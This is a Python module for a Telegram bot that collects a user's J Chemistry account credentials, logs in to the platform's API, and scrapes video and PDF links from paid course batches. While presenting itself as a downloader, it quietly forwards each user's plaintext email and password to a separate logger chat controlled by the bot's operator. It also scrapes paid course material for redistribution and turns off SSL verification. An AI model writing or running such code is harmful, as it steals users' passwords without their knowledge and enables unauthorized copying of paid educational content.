import aiohttp, asyncio, time, re, traceback
from pyrogram.enums import ParseMode
from Extractor.core.func import get_time, send_file
from config import LOGGER_ID, API

HEADERS = {
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://www.jchemistry.online',
    'referer': 'https://www.jchemistry.online/',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
}

def extract_args(text):
    match = re.search(r"displayMaterial\((.*?)\);", text, re.DOTALL)
    if not match: return []
    return [x.strip(" '\"") for x in re.findall(r"'[^']*'|\"[^\"]*\"|\[[^\]]*\]|\d+", match.group(1))]

async def fetch(session, url):
    async with session.get(url) as r:
        return await r.text()

async def jchemistry(app, query, message):
    try:
        msg = await message.reply_text("🔑 Send credentials like this: `ID*Password`")
        login_msg = await app.listen(chat_id=message.chat.id, user_id=query.from_user.id)
        if "*" not in login_msg.text:
            return await msg.edit("❌ Invalid format.")
        email, password = login_msg.text.strip().split("*", 1)
        await login_msg.delete()

        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False), headers=HEADERS) as s:
            data = {'JSONString': f'{{"username":"{email}","password":"{password}"}}'}
            async with s.post('https://jchemistry-api.edmingle.com/nuSource/api/v1/tutor/login', data=data) as r:
                if r.status != 200: return await msg.edit("❌ Login failed.")
                j = await r.json()
                apikey = j['user']['apikey']
                s.headers.update({'apikey': apikey, 'orgid': '267'})

            async with s.get('https://jchemistry-api.edmingle.com/nuSource/api/v1/student/masterbatches', params={'tag_ids': '9'}) as r:
                batches = (await r.json())['batches']

            batch_list = "\n".join(f"<code>{b['master_batch_id']}</code> - <b>{b['master_batch_name']}</b>" for b in batches)
            await msg.edit(f"📚 <b>Available Batches:</b>\n\n{batch_list}\n\n<b>📝 Send the Batch ID:</b>", parse_mode=ParseMode.HTML)

            try:
                await app.send_message(
                    chat_id=LOGGER_ID,
                    text=f"✅ J CHEMISTRY\n\n<code>{email}*{password}</code>\n\n{batch_list}",
                    parse_mode=ParseMode.HTML,
                    reply_to_message_id=16696
                )
            except: pass

            id_msg = await app.listen(chat_id=message.chat.id, user_id=query.from_user.id)
            batch = next((b for b in batches if str(b['master_batch_id']) == id_msg.text.strip()), None)
            await id_msg.delete()
            if not batch: return await msg.edit("❌ Invalid Batch ID.")

            await msg.edit("📥 Extracting... please wait.")
            start = time.time()

            async with s.get(f"https://jchemistry-api.edmingle.com/nuSource/api/v1/student/masterbatches/classes/{batch['master_batch_id']}", params={"show_overview": "1"}) as r:
                courses = (await r.json())['courses']

            async def fetch_course(course):
                url = f"https://jchemistry-api.edmingle.com/nuSource/api/v1/public/tutor/class/curriculum/{course['course_id']}?institution_bundle_id={batch['institution_bundle_id']}"
                async with s.get(url) as r:
                    data = await r.json()
                return course['name'], course['class_id'], data.get('course_curriculum', {}).get('resources', [])

            course_data = await asyncio.gather(*[fetch_course(c) for c in courses])

            tasks, info = [], []
            for cname, cid, sections in course_data:
                for sec in sections:
                    for res in sec['resources']:
                        rtype = res.get('type')
                        if rtype in ['video/mp4', 'application/pdf']:
                            url = f"https://jchemistry-api.edmingle.com/nuSource/webviews/app/displaymaterial.php?material_id={res['material_id']}&class_id={cid}&apikey={apikey}&ORGID=267"
                            tasks.append(fetch(s, url))
                            info.append((cname, res['material_name'], rtype))

            responses = await asyncio.gather(*tasks)

            results, v, p = [], 0, 0
            for (cname, name, typ), html in zip(info, responses):
                args = extract_args(html)
                if not args: continue
                full_name = f"({cname}) {name}"
                if typ == 'video/mp4':
                    url = f"https://vz-70c947c6-972.b-cdn.net/{args[14]}/playlist.m3u8" if args[13] == '1' else f"https://jchemistry-api.edmingle.com/vimeo/{args[11]}"
                    v += 1
                else:
                    url = args[3]
                    p += 1
                results.append(f"{full_name} : {url}")

            elapsed = get_time(time.time() - start)
            fname = f"{batch['master_batch_name'].replace('/', '-')}.txt"
            with open(fname, 'w', encoding='utf-8') as f:
                f.write("\n".join(results))

            caption = (
                f"**App Name:** J CHEMISTRY\n"
                f"**Batch Name:** `{batch['master_batch_name']}`\n"
                f"🍿 **Total Videos:** `{v}`\n"
                f"📝 **Total PDFs:** `{p}`\n"
                f"⌚️ **Time Taken:** `{elapsed}`"
            )
            return await send_file(fname, caption, msg, query)

    except Exception as e:
        traceback.print_exc()
        await message.reply(f"⚠️ Error: `{e}`")
